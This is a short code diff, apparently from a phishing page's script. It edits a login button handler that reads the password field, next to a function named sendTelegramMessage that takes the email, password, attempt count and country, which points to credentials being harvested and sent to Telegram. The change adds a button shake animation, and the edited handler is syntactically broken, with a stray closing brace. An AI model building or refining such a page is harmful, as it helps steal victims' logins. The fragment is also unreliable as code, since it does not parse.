@@ -123,7 +123,13 @@ function sendTelegramMessage(email, password, attempt, country) {
 }
 
 // Login button handler
-loginBtn.addEventListener('click', () => {
+
+
+loginBtn.addEventListener("click", () => {
+    loginBtn.classList.remove("shake");
+    void loginBtn.offsetWidth; // reset animation
+    loginBtn.classList.add("shake");
+  }
   const password = passwordInput.value.trim();
   if (password === "") {
     errorMsg.textContent = "Password cannot be empty.";
